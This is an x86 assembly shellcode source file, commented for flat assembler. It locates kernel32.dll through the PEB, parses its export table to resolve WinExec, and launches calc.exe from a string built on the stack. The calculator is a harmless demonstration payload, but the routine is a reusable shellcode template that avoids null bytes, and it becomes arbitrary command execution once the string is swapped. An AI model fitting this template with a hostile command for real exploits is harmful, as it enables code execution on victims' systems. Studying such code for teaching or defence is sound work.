;compiled this with flat assembler
;x32 shellcode to pop Calc.exe

format PE console
use32
entry start


start:
        ;saving registers
        push eax
        push ebx
        push ecx
        push edx
        push edi
        push esi
        push ebp



        push ebp        ;establishing stack
        mov ebp, esp
        sub esp, 18h    ;allocate space for local variables


        ;save the name(string) of our function to search
        xor esi, esi
        push esi
        push 636578h
        push 456e6957h
        mov [ebp-4],esp ;[ebp-4] = "WinExec\x00"


        ;getting kernel32.dll base address
        xor esi, esi           ;to avoid null byte
        mov ebx, [fs:30h+esi]  ;getting peb
        mov ebx, [ebx+0x0C]    ;getting ldr_data
        mov ebx, [ebx+0x14]    ;getting inMemOrderModList
        mov ebx, [ebx]         ;2nd item in linked list
        mov ebx, [ebx]         ;3rd item in linked list
        mov ebx, [ebx+0x10]    ;base_address of kernel32.dll
        mov [ebp-8], ebx       ;saving to kernel32 base to ebp-8


        ;parsing Kernel32.dll(PE file)
        mov eax, [ebx+3ch]     ;rva PE signature
        add eax, ebx           ;address of PE signature
        mov eax, [eax+78h]     ;rva of export table
        add eax, ebx           ;address of export table

        mov ecx, [eax+24h]     ;rva of ordinal table
        add ecx, ebx           ;address of ordinal table
        mov [ebp-0ch], ecx     ;saving to ebp-0ch

        mov edi, [eax+20h]     ;rva of name pointer table
        add edi, ebx           ;address of name pointer table
        mov [ebp-10h], edi     ;saving to ebp-10h

        mov edx, [eax+1ch]     ;rva of address table
        add edx, ebx           ;address of address table
        mov [ebp-14h], edx     ;saving to ebp-14

        mov edx, [eax+14h]     ;number of exported functions
        xor eax, eax           ;counter= 0

        .loop:
                mov edi, [ebp-10h]      ;edi= name pointer table
                mov esi, [ebp-4]        ;esi= "WinExec\x00"
                xor ecx, ecx
                cld
                mov edi, [edi+eax*4]    ;entries in Name pointer table(rva)
                add edi, ebx
                add cx, 8
                repe cmpsb              ;compare edi to esi byte by byte

                jz start.found

                inc eax                 ;counter++
                cmp eax, edx            ;check if last function is reached
                jb start.loop           ;jump-if below max number of function

                add esp, 28h
                jmp start.end

        .found:
                ;the counter(eax) holds the position of WinExec in ordinal table
                mov ecx, [ebp-0ch]      ;getting the ordinal table
                mov edx, [ebp-14h]      ;getting the address table

                mov ax, [ecx+eax*2]     ;ax= ordinal number
                mov eax, [edx+eax*4]    ;eax is rva of function
                add eax, ebx            ;eax= real address of winexec

                xor edx,edx             ;pushing strings
                push edx
                push 6578652eh
                push 636c6163h
                push 5c32336dh
                push 65747379h
                push 535c7377h
                push 6f646e69h
                push 575c3a43h
                mov esi,esp             ;esi -> "C:\Windows\System32\calc.exe"

                push 10                 ;window_state SW_SHOWDEFAULT
                push esi
                call eax

                add esp,48h             ;clearing the stack

        .end:
                pop ebp
                pop esi
                pop edi
                pop edx
                pop ecx
                pop ebx
                pop eax
                ret
